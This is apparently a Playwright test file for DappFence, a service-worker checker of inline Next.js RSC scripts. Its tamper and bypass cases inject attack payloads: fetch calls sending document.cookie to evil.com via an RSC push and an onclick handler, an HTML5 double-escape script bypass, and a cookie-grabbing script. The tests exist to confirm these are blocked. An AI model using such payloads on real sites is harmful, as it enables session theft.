/**
 * End-to-end tests for dynamic HTML verification.
 *
 * Each case exercises a script pattern that DappFence must eventually handle
 * without blocking legitimate pages. The manifest allows the document at
 * /nextjs/case-* and /astro/case-* paths (no full-page hash), and declares
 * a verify-dynamic rule for inline scripts (validator TBD).
 *
 * Pages are served via the remap formula: index.html content is served at the
 * case path with dynamic content injected per-test. The random/date values
 * come from the test, proving that hash-based verification cannot work for
 * these patterns.
 */
import { expect, test } from '../sw-fixtures';

test.describe('dynamic HTML — Next.js RSC', () => {
    test.beforeEach(async ({ page, swHelper }) => {
        await page.goto('');
        await expect(page).toHaveTitle('DappFence - Manifest Mode Example');
        await swHelper.waitForServiceWorkerActivation();
    });

    // Case 6a — Hard navigation: full HTML document with RSC inline scripts.
    //
    // Next.js embeds `self.__next_f.push([…])` blocks to hydrate the page.
    // Their content includes dynamic values (counter, timestamp) that change
    // every request, so their hashes cannot be pre-computed at build time.
    //
    // Today: the `allow` document rule lets the page through; no inline-script
    // verification is implemented yet so the RSC scripts are silently unverified.
    // This test will continue to pass once verify-dynamic(nextjs-rsc) is
    // implemented — that implementation must accept these scripts rather than
    // block them.
    //
    // See also: tamper variant below, which documents the expected security
    // property that is not yet enforced.
    test('case-6a: page with RSC inline scripts loads without violation', async ({
        page,
        swHelper,
    }) => {
        const counter = Math.floor(Math.random() * 1000);
        const timestamp = new Date().toISOString();

        const rscScripts =
            `<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>\n` +
            `<script>self.__next_f.push([0,["$","section",null,{"children":["$","p",null,{"children":${counter}}]}]])</script>\n` +
            `<script>self.__next_f.push([0,{"timestamp":"${timestamp}"}])</script>`;

        await swHelper.interceptAndModifyPageContent({
            pattern: '/nextjs/case-6a',
            formula: 'remap',
            args: { file: 'index.html', inject: [rscScripts, '</body>'] },
        });

        await page.goto('/nextjs/case-6a');

        await expect(page).not.toHaveURL(/\/sw-api/);
        await expect(page).toHaveTitle('DappFence - Manifest Mode Example');

        // RSC scripts executed: __next_f accumulated all three pushed frames.
        const frames = await page.evaluate(
            () => (window as Window & { __next_f?: unknown[][] }).__next_f
        );
        expect(frames).toHaveLength(3);
        expect((frames as unknown[][])[2][1]).toMatchObject({ timestamp });
    });

    // Case 6a tamper — an RSC push is injected with a JS expression in the payload
    // instead of a JSON value. The nextjs-rsc validator claims this script (it starts
    // with self.__next_f) and rejects it (the payload is not valid JSON), causing a
    // security violation.
    test('case-6a tamper: RSC push with JS expression payload should cause violation', async ({
        page,
        swHelper,
    }) => {
        const rscScripts =
            `<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>\n` +
            `<script>self.__next_f.push([0,fetch("https://evil.com?c="+document.cookie)])</script>`;

        await swHelper.interceptAndModifyPageContent({
            pattern: '/nextjs/case-6a',
            formula: 'remap',
            args: { file: 'index.html', inject: [rscScripts, '</body>'] },
        });

        // The SW aborts the navigation immediately (client already loaded); goto rejects.
        await expect(page.goto('/nextjs/case-6a')).rejects.toThrow(/ERR_ABORTED/);
        await page.waitForURL(/\/sw-api/);
    });

    // Case 6a tamper — on* event handler injected into RSC page causes violation.
    // The nextjs-rsc validator doesn't need to claim the element; the on*
    // check is unconditional and fires before any script validation.
    test('case-6a tamper: on* event handler injection should cause violation', async ({
        page,
        swHelper,
    }) => {
        const rscScripts =
            `<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>\n` +
            `<button onclick="fetch('https://evil.com?c='+document.cookie)">click</button>`;

        await swHelper.interceptAndModifyPageContent({
            pattern: '/nextjs/case-6a',
            formula: 'remap',
            args: { file: 'index.html', inject: [rscScripts, '</body>'] },
        });

        await expect(page.goto('/nextjs/case-6a')).rejects.toThrow(/ERR_ABORTED/);
        await page.waitForURL(/\/sw-api/);
    });

    // Case 6a bypass — HTML5 "Script Data Double Escaped" attack — BLOCKED.
    //
    // Attack: embed <!--<script> in the JSON payload string of a valid RSC push.
    // The HTML5 parser enters the "Script Data Double Escaped" state; the first
    // </script> is ignored. Code placed between the two </script> tags executes
    // in the browser but the tokenizer closes at the first </script>.
    //
    // Mitigation: the tokenizer fires onHazard('script-html-comment') at the third
    // character of <!--, before any </script> is reached. verifyScripts cancels
    // immediately and returns a violation — the SW aborts the navigation.
    //
    // Browser-verified independently via scripts/verify-double-escape.js (Chrome).
    test('case-6a bypass: HTML5 double-escape is blocked by hazard scanner', async ({
        page,
        swHelper,
    }) => {
        const exploitScripts =
            `<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>\n` +
            `<script>self.__next_f.push([0,"<!--<script>"])</script>/\n` +
            `window.__bypass_executed = true\n` +
            `</script>`;

        await swHelper.interceptAndModifyPageContent({
            pattern: '/nextjs/case-6a',
            formula: 'remap',
            args: { file: 'index.html', inject: [exploitScripts, '</body>'] },
        });

        // The SW detects <!-- inside script content and aborts the navigation.
        await expect(page.goto('/nextjs/case-6a')).rejects.toThrow(/ERR_ABORTED/);
        await page.waitForURL(/\/sw-api/);
    });

    // Case 6a — a non-RSC script is injected alongside valid RSC payloads.
    // claimsScript returns false for this script (doesn't start with self.__next_f),
    // so it goes to the unclaimed-script pool. The #scripts manifest entry for
    // /nextjs/case-6a lists the hash of the _devPost template script; any other
    // unclaimed script whose hash is not listed causes a violation.
    test('case-6a gap: non-RSC script injected alongside RSC payload should cause violation', async ({
        page,
        swHelper,
    }) => {
        const counter = Math.floor(Math.random() * 1000);
        const timestamp = new Date().toISOString();

        const rscScripts =
            `<script>self.__next_f=self.__next_f||[];self.__next_f.push([1,""])</script>\n` +
            `<script>self.__next_f.push([0,["$","section",null,{"children":["$","p",null,{"children":${counter}}]}]])</script>\n` +
            `<script>self.__next_f.push([0,{"timestamp":"${timestamp}"}])</script>\n` +
            `<script>/* injected by attacker */window.__exfil=document.cookie</script>`;

        await swHelper.interceptAndModifyPageContent({
            pattern: '/nextjs/case-6a',
            formula: 'remap',
            args: { file: 'index.html', inject: [rscScripts, '</body>'] },
        });

        await expect(page.goto('/nextjs/case-6a')).rejects.toThrow(/ERR_ABORTED/);
        await page.waitForURL(/\/sw-api/);
    });
});
